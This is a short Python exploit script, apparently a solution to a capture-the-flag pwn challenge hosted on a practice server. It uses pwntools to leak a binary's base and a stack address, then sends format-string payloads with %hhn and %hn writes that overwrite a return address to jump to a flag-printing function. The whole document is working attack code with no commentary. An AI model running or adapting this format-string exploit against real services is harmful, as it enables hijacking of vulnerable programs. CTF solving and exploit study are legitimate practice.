from pwn import *

io=remote('node3.buuoj.cn',26007)

io.recvuntil('time:')
[io.sendline('+') for i in range(3)]
io.recvuntil(':')
base=int(io.recvuntil(':')[:-1])-0xbd5
flag=base+0xF56
print(hex(flag&0xffff))

print(hex(base))
io.recvuntil('>>')
io.sendline('2')
fmt='%7$hhn%16$p'.ljust(16,'a')
io.send(fmt)
stack=int(io.recvuntil('aaaaa')[2:-5],16)-40
print(hex(stack))

io.recvuntil('>>')
io.sendline('2')
fmt2=('%'+str(flag&0xffff)+'c%10$hn').ljust(16,'a')+p64(stack)
io.send(fmt2)


io.interactive()